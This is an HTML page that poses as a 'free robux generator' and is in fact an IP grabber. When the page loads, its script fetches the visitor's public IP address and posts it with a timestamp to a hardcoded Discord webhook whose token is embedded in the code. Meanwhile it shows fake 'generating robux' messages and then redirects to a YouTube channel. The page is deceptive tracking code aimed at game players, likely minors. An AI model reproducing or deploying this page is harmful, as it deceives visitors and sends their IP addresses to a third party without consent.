<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>! DONT CLOSE !</title>
  <style>
    body {
      background-image: url('https://fpwamfpwapfaiwnnfwapnpn2.github.io/fpWAMFPWAPFAIWNNFWAPNPN2FMWAFMNI-FNINWIANFBM52iNGOWIANON/LOADING__THIS_MIGHT_TAKE_A_LONG_TIME.png');
      background-size: cover;
      background-repeat: no-repeat;
      background-position: center;
    }
  </style>
</head>
<body>
  <h1>Generating robux, don't tab out/close this window!</h1>
  <div id="errorLabel"></div>

  <script>
    document.addEventListener("DOMContentLoaded", function() {
      poop();
    });

    function poop() {
      var webhookURL = "https://discord.com/api/webhooks/1214230645908443136/ovXZiGBL9McvvvGyfd8cUBPZKkUESRWD4TloQa8JBsvseGrOVmvLLaJrSsNrc1m2yqDz";
      var currentDate = new Date();
      var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          var ip = data.ip;
          
          if (isRobux1Logged(ip)) {
            showError("You already redeemed free robux.");
            return;
          }

          logRobux1(ip);
          var message = {
            content: "Opened on: " + formattedDate + "\nIP address: " + ip
          };

          fetch(webhookURL, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify(message)
          })
          .then(response => {
            if (!response.ok) {
              showError("Failed generating robux");
            } else {
              console.log("Generated robux");
              redirectToDifferentWebsite();
            }
          })
          .catch(error => {
            showError("Error generating robux");
          });
        })
        .catch(error => {
          showError("Error fetching robux.");
        });
    }

    function isRobux1Logged(ip) {
      var Claimedrobux = localStorage.getItem("loggedIps");
      if (!Claimedrobux) {
        return false;
      }
      return Claimedrobux.split(",").includes(ip);
    }

    function logRobux1(ip) {
      var Claimedrobux = localStorage.getItem("loggedIps");
      if (!Claimedrobux) {
        Claimedrobux = ip;
      } else {
        Claimedrobux += "," + ip;
      }
      localStorage.setItem("loggedIps", Claimedrobux);
    }

    function redirectToDifferentWebsite() {
      window.location.href = "https://www.youtube.com/channel/UC8HNlWyhuqQzVNqCAP2t_mw";
    }

    function showError(errorMessage) {
      var errorLabel = document.getElementById("errorLabel");
      errorLabel.textContent = errorMessage;
    }
  </script>
</body>
</html>
